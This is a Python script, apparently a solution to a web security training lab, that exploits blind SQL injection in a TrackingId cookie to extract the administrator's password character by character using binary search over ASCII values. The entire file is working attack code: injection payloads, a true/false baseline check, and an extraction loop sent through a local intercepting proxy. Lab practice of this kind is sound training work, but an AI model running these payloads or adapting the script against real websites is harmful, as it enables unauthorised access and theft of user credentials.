import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
TRACKING_ID_PREFIX = '3FjmybNUhvtTL3; '   # update if it rotates
SESSION_COOKIE = '2Q65vxgYcyKstjYbdJUSsmK2KWyEf0u2'
PASSWORD_LENGTH = 20                       # you already confirmed this


def send(url, sqli_payload):
    encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': TRACKING_ID_PREFIX + encoded, 'session': SESSION_COOKIE}
    r = requests.get(url, cookies=cookies, verify=False, proxies=PROXIES)
    return "Welcome" in r.text


def sanity_check(url):
    true_payload = "' AND '1'='1"
    false_payload = "' AND '1'='2"
    ok_true = send(url, true_payload)
    ok_false = send(url, false_payload)
    print(f"(+) Baseline check -> true condition passed: {ok_true}, false condition correctly failed: {not ok_false}")
    return ok_true and not ok_false


def find_char_at_position(url, pos):
    lo, hi = 32, 126  # printable ASCII range
    while lo < hi:
        mid = (lo + hi) // 2
        payload = "' AND (SELECT ASCII(SUBSTRING(password,%d,1)) FROM users WHERE username='administrator') > %d--" % (pos, mid)
        if send(url, payload):
            lo = mid + 1
        else:
            hi = mid

    # confirm exact match before trusting it
    payload = "' AND (SELECT ASCII(SUBSTRING(password,%d,1)) FROM users WHERE username='administrator') = %d--" % (pos, lo)
    if not send(url, payload):
        return '?'  # something's off at this position — flag it, don't silently trust it
    return chr(lo)


def sqli_password(url):
    if not sanity_check(url):
        print("(!) STOP: baseline sanity check failed. Cookie/session likely stale or payload malformed.")
        return

    password_extracted = ""
    for pos in range(1, PASSWORD_LENGTH + 1):
        char = find_char_at_position(url, pos)
        password_extracted += char
        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()
    print()  # newline after final result


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://your-lab-id.web-security-academy.net/" % sys.argv[0])
        return
    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
